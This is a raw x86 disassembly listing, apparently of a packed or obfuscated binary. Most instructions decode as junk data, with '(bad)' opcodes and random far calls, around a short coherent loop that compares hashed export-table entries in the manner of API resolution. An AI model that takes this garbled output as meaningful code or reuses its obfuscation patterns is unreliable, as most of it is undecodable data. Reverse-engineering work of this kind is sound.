  40f363:	rol    BYTE PTR [ecx],0x0
  40f366:	arpl   WORD PTR [ebx-0x61b49ad9],bx
  40f36c:	mov    ds:0x54835efa,al
  40f371:	push   edx
  40f372:	sahf   
  40f373:	lds    esi,FWORD PTR [esi]
  40f375:	adc    al,0x22
  40f377:	jle    0x40f341
  40f379:	push   eax
  40f37a:	lea    esi,[esi+0x60]
  40f37d:	arpl   bp,si
  40f37f:	mov    esi,0xf32832ee
  40f384:	out    0xde,al
  40f386:	mov    ch,0x19
  40f388:	adc    BYTE PTR [ecx],cl
  40f38a:	rcl    DWORD PTR [ecx+0x52],1
  40f38d:	push   cs
  40f38e:	cmc    
  40f38f:	lods   eax,DWORD PTR ds:[esi]
  40f390:	xchg   BYTE PTR [edx+0x75],bh
  40f393:	dec    ecx
  40f394:	fimul  DWORD PTR [eax]
  40f396:	call   0x636c:0xe86e8414
  40f39d:	adc    eax,0xccf2f48a
  40f3a2:	pop    ecx
  40f3a3:	sub    eax,0x8da64d81
  40f3a8:	mov    bh,BYTE PTR [ebp+0x22]
  40f3ab:	lock push eax
  40f3ad:	popa   
  40f3ae:	mov    WORD PTR [esi-0x7d197ce7],es
  40f3b4:	pop    ds
  40f3b5:	jecxz  0x40f39d
  40f3b7:	add    BYTE PTR [eax-0x50aa92e4],0x9f
  40f3be:	mov    al,0xca
  40f3c0:	xlat   BYTE PTR ds:[ebx]
  40f3c1:	loop   0x40f360
  40f3c3:	sub    bh,dh
  40f3c5:	xor    ecx,edx
  40f3c7:	shr    al,0x5a
  40f3ca:	lahf   
  40f3cb:	scas   al,BYTE PTR es:[edi]
  40f3cc:	pop    ebx
  40f3cd:	call   0xb50f04e
  40f3d2:	cs push ds
  40f3d4:	lds    ecx,FWORD PTR [ebx-0x4eec3c9c]
  40f3da:	mov    DWORD PTR [edx-0x440a0202],ebx
  40f3e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3e1:	mov    esp,DWORD PTR [ebx+0x321b51ff]
  40f3e7:	fmul   DWORD PTR [edi-0x34f02b1d]
  40f3ed:	aaa    
  40f3ee:	mov    WORD PTR [ebx-0x67bf7401],fs
  40f3f4:	outs   dx,DWORD PTR ds:[esi]
  40f3f5:	cmp    al,BYTE PTR [ecx+0x1a]
  40f3f8:	std    
  40f3f9:	pop    edi
  40f3fa:	sub    DWORD PTR [edi],ebx
  40f3fc:	js     0x40f3f2
  40f3fe:	push   edi
  40f3ff:	icebp  
  40f400:	test   bl,dh
  40f402:	ror    DWORD PTR [ebx-0x26],cl
  40f405:	xor    cl,BYTE PTR [edi]
  40f407:	scas   eax,DWORD PTR es:[edi]
  40f408:	mov    eax,0xb87342ce
  40f40d:	xor    bl,ch
  40f40f:	jno    0x40f3fa
  40f411:	pop    eax
  40f412:	into   
  40f413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f414:	inc    ecx
  40f415:	lods   al,BYTE PTR ds:[esi]
  40f416:	ficomp WORD PTR [ecx-0xb03b8ae]
  40f41c:	mov    es:0xe4d8d118,eax
  40f422:	mov    ecx,0x1921234e
  40f427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f428:	add    edi,eax
  40f42a:	jmp    0x2b09a6ce
  40f42f:	popa   
  40f430:	ja     0x40f480
  40f432:	fldenv [esi+ebx*1-0x396ff143]
  40f439:	ins    DWORD PTR es:[edi],dx
  40f43a:	pop    edi
  40f43b:	shr    BYTE PTR [ebp-0x7],cl
  40f43e:	enter  0xc625,0x64
  40f442:	repz sub edi,DWORD PTR [eax]
  40f445:	out    0xc9,al
  40f447:	(bad)  
  40f448:	in     al,0xc4
  40f44a:	jg     0x40f422
  40f44c:	pop    ds
  40f44d:	and    DWORD PTR [edi+ebx*8-0x1f90adac],ebx
  40f454:	(bad)  
  40f455:	xchg   ebx,eax
  40f456:	mov    al,0xd8
  40f458:	bound  esi,QWORD PTR cs:[eax+0x2b]
  40f45c:	xchg   DWORD PTR [edx-0x60068f98],esp
  40f462:	test   al,0x27
  40f464:	jmp    0x40f4d3
  40f466:	mov    ecx,0xa2b87182
  40f46b:	lock cmp eax,DWORD PTR [edi-0x4e]
  40f46f:	mov    ah,0x62
  40f471:	xor    al,0x43
  40f473:	jnp    0x40f484
  40f475:	cmp    BYTE PTR [ebx+edx*4-0x54],0x88
  40f47a:	in     eax,0x20
  40f47c:	mov    edi,0x6652e777
  40f481:	or     eax,0x484e68cf
  40f486:	aam    0x76
  40f488:	data16 fimul DWORD PTR ds:[edx-0x76494a15]
  40f490:	inc    ebp
  40f491:	in     al,dx
  40f492:	mov    DWORD PTR ds:0x42a2aa,0x1f
  40f49c:	cmp    DWORD PTR ds:0x42a2aa,0x0
  40f4a3:	je     0x40f4e0
  40f4a9:	cmp    DWORD PTR ds:0x42a2aa,0x2b
  40f4b0:	jg     0x40f4e0
  40f4b6:	jmp    0x40f4ce
  40f4bb:	push   DWORD PTR [ebp-0x20]
  40f4be:	push   0x68ce
  40f4c3:	push   0x13fc
  40f4c8:	call   DWORD PTR ds:0x42a40e
  40f4ce:	mov    ecx,DWORD PTR ds:0x42a2aa
  40f4d4:	dec    ecx
  40f4d5:	mov    DWORD PTR ds:0x42a2aa,ecx
  40f4db:	jmp    0x40f49c
  40f4e0:	mov    eax,DWORD PTR [ebp-0x4]
  40f4e3:	mov    ecx,DWORD PTR ds:0x42a2ea
  40f4e9:	adc    ecx,DWORD PTR ds:0x42a2fe
  40f4ef:	mov    DWORD PTR ds:0x42a2ea,ecx
  40f4f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f4f8:	sub    DWORD PTR ds:0x42a256,0x42a2c6
  40f502:	xor    eax,esi
  40f504:	xor    DWORD PTR ds:0x42a27a,0x42a276
  40f50e:	add    eax,edi
  40f510:	mov    DWORD PTR ds:0x42a26a,0x50b9
  40f51a:	cmp    ecx,eax
  40f51c:	je     0x413d1d
  40f522:	xor    ecx,DWORD PTR ds:0x42a2ee
  40f528:	mov    eax,DWORD PTR [ebp-0x14]
  40f52b:	xor    ecx,0x6e1c
  40f531:	mov    eax,DWORD PTR [eax+0x18]
  40f534:	mov    DWORD PTR [ebp-0x24],eax
  40f537:	mov    eax,DWORD PTR [ebp-0x14]
  40f53a:	xor    ecx,ecx
  40f53c:	or     ecx,DWORD PTR ds:0x42a29e
  40f542:	xor    DWORD PTR ds:0x42a2aa,ecx
  40f548:	mov    ecx,DWORD PTR [ebp+0x8]
  40f54b:	xor    DWORD PTR ds:0x42a2e6,0x42a2f6
  40f555:	add    ecx,DWORD PTR [eax+0x20]
  40f558:	mov    DWORD PTR [ebp-0x2c],ecx
  40f55b:	mov    eax,ds:0x42a2d6
  40f560:	and    DWORD PTR ds:0x42a29e,eax
  40f566:	mov    eax,DWORD PTR [ebp-0x14]
  40f569:	mov    ecx,DWORD PTR [ebp+0x8]
  40f56c:	adc    DWORD PTR ds:0x42a2c2,0xc51
  40f576:	add    ecx,DWORD PTR [eax+0x24]
  40f579:	xor    DWORD PTR ds:0x42a28a,0x42a29e
  40f583:	mov    DWORD PTR [ebp-0x34],ecx
  40f586:	mov    eax,DWORD PTR [ebp-0x14]
  40f589:	mov    ecx,DWORD PTR [ebp+0x8]
  40f58c:	add    ecx,DWORD PTR [eax+0x1c]
  40f58f:	mov    DWORD PTR [ebp-0x14],ecx
  40f592:	jmp    0x411969
  40f597:	mov    eax,DWORD PTR [ebp-0x2c]
  40f59a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f59d:	add    ecx,DWORD PTR [eax+ebx*4]
  40f5a0:	mov    DWORD PTR [ebp-0x28],ecx
  40f5a3:	mov    eax,DWORD PTR [ebp-0x4]
  40f5a6:	mov    ecx,DWORD PTR [ebp-0x28]
  40f5a9:	xor    eax,esi
  40f5ab:	add    eax,edi
  40f5ad:	cmp    ecx,eax
  40f5af:	je     0x411969
  40f5b5:	jmp    0x41195a
  40f5ba:	mov    eax,DWORD PTR [ebp-0x4]
  40f5bd:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5c0:	xor    eax,esi
  40f5c2:	add    eax,edi
  40f5c4:	cmp    ecx,eax
  40f5c6:	mov    eax,DWORD PTR [ebp-0x4]
  40f5c9:	je     0x413d20
  40f5cf:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5d2:	xor    eax,esi
  40f5d4:	add    eax,edi
  40f5d6:	cmp    ecx,eax
  40f5d8:	je     0x413d29
  40f5de:	jmp    0x41195a
  40f5e3:	or     al,BYTE PTR es:[edx-0x17]
  40f5e7:	inc    edx
  40f5e8:	mov    eax,ds:0x1d8d8286
  40f5ed:	ins    DWORD PTR es:[edi],dx
  40f5ee:	mov    al,ds:0x872cb368
  40f5f3:	jno    0x40f59d
  40f5f5:	add    DWORD PTR [ebx-0x7c7ca1de],0x5e
  40f5fc:	fcmovnu st,st(2)
  40f5fe:	or     bh,dl
  40f600:	and    edx,0x7c
  40f603:	aaa    
  40f604:	xchg   esp,eax
  40f605:	das    
  40f606:	xor    edx,DWORD PTR [esi+0x5b51c404]
  40f60c:	push   esi
  40f60d:	push   0x881c93
  40f612:	add    BYTE PTR [eax+0x467d3d1],cl
  40f618:	add    eax,0xf8318b79
  40f61d:	push   ebx
  40f61e:	fs nop
  40f620:	pop    ebx
  40f621:	mov    ebp,0x832cd453
  40f626:	cmp    eax,0xdd3dbd44
  40f62b:	lahf   
  40f62c:	nop
  40f62d:	inc    esi
  40f62e:	sub    BYTE PTR [si-0x503d],bh
  40f633:	shl    BYTE PTR [eax+0x67a8050a],0x6a
  40f63a:	sub    bl,cl
  40f63c:	in     al,dx
  40f63d:	fldenv [eax+0x7c]
  40f640:	inc    esp
  40f641:	inc    eax
  40f642:	shr    BYTE PTR [ebp-0x4d57ac65],1
  40f648:	cdq    
  40f649:	pusha  
  40f64a:	loope  0x40f68d
  40f64c:	dec    ebx
  40f64d:	adc    BYTE PTR [edi+ebp*2-0x58],0x99
  40f652:	adc    edi,DWORD PTR [eax-0x2d]
  40f655:	fimul  DWORD PTR [esi]
  40f657:	dec    ebp
  40f658:	fwait
  40f659:	cs push ebp
  40f65b:	push   ebx
  40f65c:	xchg   BYTE PTR cs:[edx+0x32ffdb43],bl
  40f663:	(bad)  
  40f664:	call   0x12388c14
  40f669:	mov    edi,edi
  40f66b:	pop    edi
  40f66c:	in     al,dx
  40f66d:	mov    dh,0x49
  40f66f:	std    
  40f670:	ja     0x40f65c
  40f672:	push   0xffffffc2
  40f674:	sub    al,0x89
  40f676:	jecxz  0x40f691
  40f678:	push   ebx
  40f679:	ret    0x6cdc
  40f67c:	mov    eax,0xcb6f1fba
  40f681:	jge    0x40f6c1
  40f683:	add    ebp,ebx
  40f685:	hlt    
  40f686:	push   cs
  40f687:	dec    BYTE PTR [ecx+0x6d]
  40f68a:	xor    al,dh
  40f68c:	dec    ebx
  40f68d:	out    dx,al
  40f68e:	jmp    0xb588305
  40f693:	es data16 out 0x2b,al
  40f697:	jb     0x40f63a
  40f699:	mov    ebp,0x96220085
  40f69e:	push   ss
  40f69f:	out    0x2d,eax
  40f6a1:	sub    ah,BYTE PTR [edx-0x1433897d]
  40f6a7:	leave  
  40f6a8:	fld    QWORD PTR ds:0x2e33c2c8
  40f6ae:	add    al,0x5c
  40f6b0:	setne  BYTE PTR [esi]
  40f6b3:	repnz jecxz 0x40f636
  40f6b6:	mov    eax,cs
  40f6b8:	or     DWORD PTR [ebx],esi
  40f6ba:	mov    dh,0xc2
  40f6bc:	cmp    BYTE PTR [esi],cl
  40f6be:	push   ecx
  40f6bf:	pcmpgtw mm6,mm6
  40f6c2:	rcr    edi,0x60
  40f6c5:	jbe    0x40f673
  40f6c7:	and    BYTE PTR [eax+0x5e],dl
  40f6ca:	stos   DWORD PTR es:[edi],eax
  40f6cb:	xchg   edx,eax
  40f6cc:	push   0xb7654010
  40f6d1:	ds int 0xb8
  40f6d4:	stos   DWORD PTR es:[edi],eax
  40f6d5:	dec    edi
  40f6d6:	imul   edi,DWORD PTR [eax],0x6e
  40f6d9:	lock jb 0x40f663
  40f6dc:	retf   
  40f6dd:	mov    ds:0xd4fa7914,eax
  40f6e2:	push   edi
  40f6e3:	fisub  DWORD PTR [eiz*1-0x54cdc191]
  40f6ea:	and    eax,0xe385851d
  40f6ef:	pop    esp
  40f6f0:	das    
  40f6f1:	push   esp
  40f6f2:	clc    
  40f6f3:	fiadd  WORD PTR [edx]
  40f6f5:	adc    BYTE PTR [edi],cl
  40f6f7:	loope  0x40f6db
  40f6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6fa:	popa   
  40f6fb:	ja     0x40f755
  40f6fd:	scas   al,BYTE PTR es:[edi]
  40f6fe:	mov    ebp,0xbfd0009d
  40f703:	push   edi
  40f704:	adc    BYTE PTR [eax],bl
  40f706:	push   edx
  40f707:	mov    ds:0xc7ed52c5,eax
  40f70c:	daa    
  40f70d:	mov    edi,0x7db436b1
  40f712:	bswap  ebp
  40f714:	lahf   
  40f715:	jns    0x40f75b
  40f717:	jnp    0x40f6f3
  40f719:	jbe    0x40f778
  40f71b:	mov    BYTE PTR [esi+eax*2],bh
  40f71e:	mov    bh,0x8c
  40f720:	sbb    al,0x1f
  40f722:	fcom   QWORD PTR ds:0xd71f6e07
  40f728:	lea    eax,[ebx]
  40f72a:	fucomi st,st(3)
  40f72c:	scas   al,BYTE PTR es:[edi]
  40f72d:	ins    DWORD PTR es:[edi],dx
  40f72e:	scas   al,BYTE PTR es:[edi]
  40f72f:	add    al,cl
  40f731:	imul   ebp,DWORD PTR [esi+ecx*1+0x15],0x6b
  40f736:	sbb    al,0xe7
  40f738:	clc    
  40f739:	pxor   mm2,QWORD PTR [esi-0x23359584]
  40f740:	jb     0x40f6e2
  40f742:	(bad)  
  40f743:	dec    eax
  40f744:	pop    ss
  40f745:	repnz scas eax,DWORD PTR es:[edi]
  40f747:	dec    esp
  40f748:	adc    DWORD PTR [edx-0x6691279],0xffffff88
  40f74f:	pop    esp
  40f750:	iret   
  40f751:	dec    BYTE PTR [edi-0x38faf840]
  40f757:	inc    edx
  40f758:	loope  0x40f74b
  40f75a:	dec    ebx
  40f75b:	xchg   ecx,eax
  40f75c:	punpckhdq mm5,QWORD PTR [edx+0x12]
  40f760:	xor    al,BYTE PTR [eax+edi*8-0x4f]
  40f764:	call   0x3ca1:0xb65cdf75
  40f76b:	cmp    DWORD PTR [ecx-0x57],0xe890215c
  40f772:	lds    esp,FWORD PTR [edx+ecx*1+0x79]
  40f776:	sbb    eax,0x10b530fc
  40f77b:	sbb    BYTE PTR [ecx],cl
  40f77d:	adc    dl,dl
  40f77f:	push   edi
  40f780:	test   DWORD PTR [esi],ebx
  40f782:	jb     0x40f723
  40f784:	xchg   BYTE PTR [eax+0x10],dl
  40f787:	lods   al,BYTE PTR ds:[esi]
  40f788:	dec    edx
  40f789:	fwait
  40f78a:	daa    
  40f78b:	sbb    esp,DWORD PTR [ebx+0x10]
  40f78e:	jle    0x40f724
  40f790:	lahf   
  40f791:	fsubr  st(0),st
  40f793:	outs   dx,DWORD PTR ds:[esi]
  40f794:	lock inc ebx
  40f796:	popa   
  40f797:	or     DWORD PTR [ebp+0x66],edx
  40f79a:	dec    edx
  40f79b:	mov    ebx,0xeab17858
  40f7a0:	cmp    al,0x92
  40f7a2:	xchg   ecx,eax
  40f7a3:	push   ecx
  40f7a4:	jb     0x40f7ff
  40f7a6:	cmp    DWORD PTR [edx+0x64],0x1f
  40f7aa:	in     al,dx
  40f7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ac:	into   
  40f7ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ae:	gs cmc 
  40f7b0:	into   
  40f7b1:	in     al,dx
  40f7b2:	jmp    ecx
  40f7b4:	scas   al,BYTE PTR es:[edi]
  40f7b5:	adc    ebx,DWORD PTR [eax]
  40f7b7:	(bad)  
  40f7b8:	js     0x40f758
  40f7ba:	mov    cl,0x5d
  40f7bc:	inc    ebx
  40f7bd:	xchg   esi,eax
  40f7be:	and    bl,BYTE PTR [esi]
  40f7c0:	jno    0x40f749
  40f7c2:	(bad)  
  40f7c3:	bound  ebx,QWORD PTR [edi+0x5802fad8]
  40f7c9:	cmp    al,0x6f
  40f7cb:	std    
  40f7cc:	(bad)  
  40f7ce:	xchg   ecx,eax
  40f7cf:	test   BYTE PTR ds:0xf3382eda,0xde
  40f7d6:	inc    ebp
  40f7d7:	fisub  WORD PTR [ebx+0x7c3462dc]
  40f7dd:	sbb    ebx,eax
  40f7df:	adc    esp,DWORD PTR [ebx]
  40f7e1:	dec    edx
  40f7e2:	dec    ebx
  40f7e3:	sbb    esp,DWORD PTR [eax+0x5561f6be]
  40f7e9:	icebp  
  40f7ea:	dec    edx
  40f7eb:	jbe    0x40f845
  40f7ed:	popa   
  40f7ee:	sbb    DWORD PTR [ecx-0x2622fb3b],0xffffff83
  40f7f5:	clc    
  40f7f6:	loop   0x40f7cc
  40f7f8:	add    ah,cl
  40f7fa:	rol    DWORD PTR [edi+0x2de2963b],0x9c
  40f801:	ins    DWORD PTR es:[edi],dx
  40f802:	mov    dl,0x3f
  40f804:	adc    eax,0x849ed26b
  40f809:	rcr    BYTE PTR [ecx+0x3d],cl
  40f80c:	out    dx,al
  40f80d:	arpl   WORD PTR [ebp-0x1f],si
  40f810:	out    dx,eax
  40f811:	and    al,0xe5
  40f813:	mov    ds:0x6355b991,eax
  40f818:	enter  0x25fe,0xa3
  40f81c:	inc    ebx
  40f81d:	(bad)  
  40f81e:	aam    0x5e
  40f820:	lods   al,BYTE PTR ds:[si]
  40f822:	fwait
  40f823:	dec    edx
  40f824:	into   
  40f825:	xchg   edi,eax
  40f826:	or     eax,edi
  40f828:	jno    0x40f823
  40f82a:	xor    al,0xc7
  40f82c:	and    DWORD PTR [ebp+0x29],eax
  40f82f:	outs   dx,DWORD PTR ds:[esi]
  40f830:	ret    0x1772
  40f833:	dec    eax
  40f834:	xchg   cl,ch
  40f836:	mov    ebp,0x2c85535c
  40f83b:	das    
  40f83c:	je     0x40f839
  40f83e:	jmp    0x3e0715fc
  40f843:	stos   BYTE PTR es:[edi],al
  40f844:	inc    ebx
  40f845:	inc    esi
  40f846:	jae    0x40f87d
  40f848:	pop    edx
  40f849:	in     eax,0xe2
  40f84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f84c:	dec    ebp
  40f84d:	cmp    DWORD PTR [edi+eiz*4],esi
  40f850:	aam    0x7d
  40f852:	sbb    al,0x2c
  40f854:	pop    ss
  40f855:	sub    BYTE PTR [ebx],al
  40f857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f858:	rol    BYTE PTR [edx-0x2f],cl
  40f85b:	add    ch,bh
  40f85d:	adc    eax,0x5a0b83c4
  40f862:	mov    dl,0x99
  40f864:	test   DWORD PTR [edx+esi*8+0x50],ecx
  40f868:	jo     0x40f817
  40f86a:	clc    
  40f86b:	mov    ebp,0xe1b243cd
  40f870:	out    0xfa,al
  40f872:	jl     0x40f822
  40f874:	ret    0x371
  40f877:	imul   ecx,DWORD PTR [eax-0x6f3ab355],0xfffffff0
  40f87e:	sar    BYTE PTR [ebx],0x3f
  40f881:	and    ah,bh
  40f883:	sti    
  40f884:	jle    0x40f846
  40f886:	popa   
  40f887:	imul   ebx,DWORD PTR [eax-0xe],0xffffff92
  40f88b:	shr    bh,0xf3
  40f88e:	or     ebp,DWORD PTR [ecx]
  40f890:	cmp    al,0x36
  40f892:	mov    dh,0xb2
  40f894:	fs jno 0x40f8c9
  40f897:	jecxz  0x40f8a4
  40f899:	push   esi
  40f89a:	rcl    DWORD PTR [edx],0xe7
  40f89d:	ins    BYTE PTR es:[edi],dx
  40f89e:	pop    ebp
  40f89f:	sbb    DWORD PTR [eax],ecx
  40f8a1:	or     ecx,edi
  40f8a3:	in     al,0x5a
  40f8a5:	jge    0x40f82b
  40f8a7:	(bad)  
  40f8a8:	frstor [esi+0x65]
  40f8ab:	push   es
  40f8ac:	cli    
  40f8ad:	popf   
  40f8ae:	je     0x40f8a7
  40f8b0:	xchg   ebp,eax
  40f8b1:	(bad)  
  40f8b2:	fistp  DWORD PTR [eax-0x1fd1e2a]
  40f8b8:	pop    ecx
  40f8b9:	xchg   edi,eax
  40f8ba:	pusha  
  40f8bb:	ds iret 
  40f8bd:	mov    ds:0x700aa994,al
  40f8c2:	mov    ecx,0x679044cc
  40f8c7:	jbe    0x40f878
  40f8c9:	jae    0x40f872
  40f8cb:	mov    eax,ds:0x68bdb88
  40f8d0:	sti    
  40f8d1:	test   eax,0xb76503e9
  40f8d6:	sbb    DWORD PTR [ebx+esi*4-0x67],edx
  40f8da:	leave  
  40f8db:	cdq    
  40f8dc:	cdq    
  40f8dd:	ds jg  0x40f958
  40f8e0:	gs pop eax
  40f8e2:	inc    edi
  40f8e3:	mov    esi,0x2f322224
  40f8e8:	or     DWORD PTR [ebp-0x55],0xf6e115c9
  40f8ef:	sub    al,0x6b
  40f8f1:	xor    edx,DWORD PTR [ecx-0x53]
  40f8f4:	das    
  40f8f5:	dec    ah
  40f8f7:	(bad)  
  40f8f8:	pop    eax
  40f8f9:	adc    ch,al
  40f8fb:	repz dec esp
  40f8fd:	cmp    BYTE PTR [esi+0x565f499d],ch
  40f903:	(bad)  
  40f904:	popf   
  40f905:	out    dx,al
  40f906:	adc    DWORD PTR [eax-0x49],esp
  40f909:	push   ds
  40f90a:	add    al,0xc8
  40f90c:	ss add esp,esi
  40f90f:	mov    esp,0x33629530
  40f914:	ss xchg esi,eax
  40f916:	pusha  
  40f917:	dec    edx
  40f918:	popa   
  40f919:	ret    
  40f91a:	cmp    al,0x0
  40f91c:	mov    DWORD PTR [ebx-0x169517ba],eax
  40f922:	dec    esi
  40f923:	nop
  40f924:	dec    ebp
  40f925:	push   ebx
  40f926:	stc    
  40f927:	stos   DWORD PTR es:[edi],eax
  40f928:	mov    ecx,0xcdd447f0
  40f92d:	push   eax
  40f92e:	mov    esi,0x10146cf9
  40f933:	mov    cl,0x62
  40f935:	or     ah,0x64
  40f938:	call   0x9acb:0xc84ac3e8
  40f93f:	in     al,0xf6
  40f941:	mov    esp,0x90d7e292
  40f946:	add    al,0x80
  40f948:	nop
  40f949:	in     al,0xf
  40f94b:	push   cs
  40f94c:	mov    bl,0x75
  40f94e:	sahf   
  40f94f:	pop    edx
  40f950:	pop    esp
  40f951:	mov    BYTE PTR [ebx],dl
  40f953:	stos   DWORD PTR es:[edi],eax
  40f954:	popa   
  40f955:	sbb    bl,0x69
  40f958:	cwde   
  40f959:	call   0xba4b200c
  40f95e:	int    0xb6
  40f960:	in     eax,0xe
  40f962:	add    cl,cl
  40f964:	call   0x2d972771
  40f969:	(bad)  
  40f96a:	bound  esp,QWORD PTR [ebp-0x4e208c3f]
  40f970:	jmp    FWORD PTR [edx]
  40f972:	imul   ebp,DWORD PTR [esi+0x612def7a],0x42feb35c
  40f97c:	jae    0x40f950
  40f97e:	pop    edx
  40f97f:	(bad)
  40f983:	ins    DWORD PTR es:[edi],dx
  40f984:	jmp    FWORD PTR [eax]
  40f986:	mov    ds:0x37df9eed,al
  40f98b:	inc    ecx
  40f98c:	xor    DWORD PTR [edi-0x1c],esp
  40f98f:	push   edx
  40f990:	cdq    
  40f991:	mov    dh,0xf0
  40f993:	and    al,0xa1
  40f995:	mov    ebp,0x89a6ab0a
  40f99a:	add    esp,DWORD PTR [esi]
  40f99c:	in     al,0x16
  40f99e:	ss aad 0x2f
  40f9a1:	inc    esi
  40f9a2:	leave  
  40f9a3:	fsub   st,st(7)
  40f9a5:	inc    ebp
  40f9a6:	pushf  
  40f9a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9a8:	jmp    0x40f96f
  40f9aa:	out    dx,eax
  40f9ab:	push   cs
  40f9ac:	(bad)  
  40f9ad:	jecxz  0x40f997
  40f9af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9b0:	xor    ecx,DWORD PTR [ecx-0x4bb4274]
  40f9b6:	pop    edx
  40f9b7:	fwait
  40f9b8:	bswap  eax
  40f9ba:	xor    eax,0xc0310136
  40f9bf:	mov    ah,bh
  40f9c1:	test   al,0x32
  40f9c3:	pop    edi
  40f9c4:	inc    esi
  40f9c5:	pop    ebp
  40f9c6:	jo     0x40f9c6
  40f9c8:	cmc    
  40f9c9:	cmp    DWORD PTR [esi+0x4b],edi
  40f9cc:	push   ebx
  40f9cd:	mov    dh,0xe4
  40f9cf:	lods   al,BYTE PTR ds:[esi]
  40f9d0:	adc    al,0xe4
  40f9d2:	push   edi
  40f9d3:	inc    esi
  40f9d4:	push   ss
  40f9d5:	icebp  
  40f9d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9d7:	and    eax,0x9d31666e
  40f9dc:	mov    eax,ebp
  40f9de:	cmp    cl,BYTE PTR [ebp-0x3]
  40f9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e2:	ins    BYTE PTR es:[edi],dx
  40f9e3:	adc    eax,0xb40be63c
  40f9e8:	out    dx,eax
  40f9e9:	mov    eax,0xb012c6a3
  40f9ee:	add    ebp,DWORD PTR [ecx-0x58]
  40f9f1:	xchg   DWORD PTR [ecx],ebp
  40f9f3:	pop    esp
  40f9f4:	adc    DWORD PTR [esi],ebp
  40f9f6:	aam    0x84
  40f9f8:	dec    ecx
  40f9f9:	scas   eax,DWORD PTR es:[edi]
  40f9fa:	fs daa 
  40f9fc:	retf   
  40f9fd:	test   DWORD PTR [esi],esp
  40f9ff:	je     0x40f9fd
  40fa01:	das    
  40fa02:	mov    ebx,0xa4b9dcb8
  40fa07:	mov    bh,0xa
  40fa09:	sub    BYTE PTR [ecx-0x4a],ah
  40fa0c:	in     al,0x24
  40fa0e:	cs lock adc eax,0xe3fc4f32
  40fa15:	inc    edi
  40fa16:	call   0xcb27:0x90de04ea
  40fa1d:	and    al,0x12
  40fa1f:	adc    al,0x43
  40fa21:	adc    edx,DWORD PTR [edx+0x56]
  40fa24:	shr    BYTE PTR [ecx+0x1875651f],0x65
  40fa2b:	mov    ecx,0x39d6c582
  40fa30:	mov    bh,0x49
  40fa32:	and    DWORD PTR ds:[edi-0x6d],0x2d
  40fa37:	or     DWORD PTR [ebp+0x1cdebccc],edx
  40fa3d:	and    BYTE PTR [esi],dl
  40fa3f:	jp     0x40fa18
  40fa41:	fdiv   QWORD PTR [edi+0x39c55710]
  40fa47:	cmp    al,0x10
  40fa49:	jecxz  0x40fa3d
  40fa4b:	in     eax,dx
  40fa4c:	xchg   ebx,eax
  40fa4d:	sbb    al,0xc5
  40fa4f:	gs scas eax,DWORD PTR es:[edi]
  40fa51:	aam    0xc6
  40fa53:	outs   dx,BYTE PTR ds:[esi]
  40fa54:	test   DWORD PTR [si-0x5315],ebp
  40fa59:	xor    al,BYTE PTR [ebx+0x1f]
  40fa5c:	or     bl,BYTE PTR [eax]
  40fa5e:	ja     0x40fa6c
  40fa60:	xchg   BYTE PTR [ebx+ebp*2],ch
  40fa63:	or     DWORD PTR [edi],ebx
  40fa65:	cwde   
  40fa66:	stc    
  40fa67:	aaa    
  40fa68:	dec    edi
  40fa69:	in     eax,0x54
  40fa6b:	push   edx
  40fa6c:	int    0xfd
  40fa6e:	scas   al,BYTE PTR es:[edi]
  40fa6f:	cld    
  40fa70:	pop    ds
  40fa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa72:	dec    ebx
  40fa73:	cli    
  40fa74:	jae    0x40faab
  40fa76:	rcr    DWORD PTR [edi],0xb1
  40fa79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa7a:	mov    al,ds:0x2b568bae
  40fa7f:	sbb    DWORD PTR [ebx+0x4b],esi
  40fa82:	std    
  40fa83:	jl     0x40fb01
  40fa85:	shl    DWORD PTR [ebx+0x6315a1dc],1
  40fa8b:	jno    0x40fad6
  40fa8d:	jmp    0x99dcda83
  40fa92:	addr16 into 
  40fa94:	rcr    DWORD PTR [edx],1
  40fa96:	aas    
  40fa97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa98:	dec    ecx
  40fa99:	inc    edx
  40fa9a:	inc    esp
  40fa9b:	dec    ecx
  40fa9c:	outs   dx,BYTE PTR ds:[esi]
  40fa9d:	mov    al,0x89
  40fa9f:	jne    0x40fa60
  40faa1:	mov    ss,esi
  40faa3:	mov    edx,0x5163732
  40faa8:	test   al,0x33
  40faaa:	shl    BYTE PTR [edi+0x59ba8f85],0xff
  40fab1:	fmul   st,st(0)
  40fab3:	hlt    
  40fab4:	add    al,0x52
  40fab6:	push   ecx
  40fab7:	int    0x2a
  40fab9:	mov    eax,0xe260711d
  40fabe:	jnp    0x40faae
  40fac0:	push   edi
  40fac1:	iret   
  40fac2:	out    dx,al
  40fac3:	ret    0xee22
  40fac6:	xchg   DWORD PTR [esi],ebx
  40fac8:	(bad)  
  40fac9:	push   0xffffffe4
  40facb:	sub    eax,0xa163fd40
  40fad0:	pushf  
  40fad1:	sbb    BYTE PTR [edi-0x3f],ah
  40fad4:	push   edx
  40fad5:	rcr    bl,1
  40fad7:	push   0x9a77e314
  40fadc:	xchg   esi,eax
  40fadd:	pop    ecx
  40fade:	mov    edi,0x111d4055
  40fae3:	inc    ebp
  40fae4:	jg     0x40fb5f
  40fae6:	sbb    ah,BYTE PTR [esi-0x24]
  40fae9:	call   0xab47:0x566299ed
  40faf0:	push   ds
  40faf1:	mul    BYTE PTR [esi-0x65fe7e64]
  40faf7:	loop   0x40fadd
  40faf9:	repz inc eax
  40fafb:	and    al,0xb
  40fafd:	mov    ch,0xfb
  40faff:	into   
